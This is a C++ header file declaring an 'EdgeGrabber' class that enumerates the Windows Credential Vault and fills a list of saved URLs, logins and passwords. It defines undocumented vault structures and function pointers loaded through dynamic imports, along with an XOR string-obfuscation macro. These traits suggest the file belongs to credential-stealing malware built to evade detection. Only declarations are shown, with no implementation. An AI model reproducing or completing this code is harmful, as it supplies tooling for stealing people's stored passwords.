#pragma once
#include <Windows.h>
#include <string>
#include <vector>

#include "DynImport.h"
#include "xor.h"

using std::string;
using std::vector;

#define XOR(x) XorStr(x)

struct Password
{
	string url;
	string login;
	string password;
};

typedef HANDLE HVAULT;
#define VAULT_ENUMERATE_ALL_ITEMS 512

enum VAULT_SCHEMA_ELEMENT_ID 
{
	ElementId_Illegal = 0,
	ElementId_Resource = 1,
	ElementId_Identity = 2,
	ElementId_Authenticator = 3,
	ElementId_Tag = 4,
	ElementId_PackageSid = 5,
	ElementId_AppStart = 0x64,
	ElementId_AppEnd = 0x2710
};

enum VAULT_ELEMENT_TYPE
{
	ElementType_Boolean = 0,
	ElementType_Short = 1,
	ElementType_UnsignedShort = 2,
	ElementType_Integer = 3,
	ElementType_UnsignedInteger = 4,
	ElementType_Double = 5,
	ElementType_Guid = 6,
	ElementType_String = 7,
	ElementType_ByteArray = 8,
	ElementType_TimeStamp = 9,
	ElementType_ProtectedArray = 0xA,
	ElementType_Attribute = 0xB,
	ElementType_Sid = 0xC,
	ElementType_Last = 0xD,
	ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER 
{
	DWORD Length;
	PBYTE Value;
} VAULT_BYTE_BUFFER, *PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA 
{
	DWORD SchemaElementId;
	DWORD unk0;
	VAULT_ELEMENT_TYPE Type;
	DWORD unk1;
	union 
	{
		BOOL Boolean;
		SHORT Short;
		WORD UnsignedShort;
		LONG Int;
		ULONG UnsignedInt;
		DOUBLE Double;
		GUID Guid;
		LPWSTR String;
		VAULT_BYTE_BUFFER ByteArray;
		VAULT_BYTE_BUFFER ProtectedArray;
		DWORD Attribute;
		DWORD Sid;
	} data;
} VAULT_ITEM_DATA, *PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8 
{
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Resource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	PVAULT_ITEM_DATA PackageSid;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, *PVAULT_ITEM;

typedef DWORD(WINAPI *VaultEnumerateVaults)(DWORD flags, PDWORD count, GUID **guids);
typedef DWORD(WINAPI *VaultEnumerateItems)(HVAULT handle, DWORD flags, PDWORD count, PVOID *items);
typedef DWORD(WINAPI *VaultOpenVault)(GUID *id, DWORD flags, HVAULT *handle);
typedef DWORD(WINAPI *VaultCloseVault)(HVAULT handle);
typedef DWORD(WINAPI *VaultFree)(PVOID mem);
typedef DWORD(WINAPI * PVAULTGETITEM) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM * pItem);

class EdgeGrabber
{
	VaultEnumerateItems  pVaultEnumerateItems;
	VaultFree            pVaultFree;
	VaultOpenVault       pVaultOpenVault;
	VaultCloseVault      pVaultCloseVault;
	VaultEnumerateVaults pVaultEnumerateVaults;
	PVAULTGETITEM       pVaultGetItem;
	string WcharToString(wchar_t* str);
public:
	bool Init();
	void FillPasswords(vector<Password>& output);
};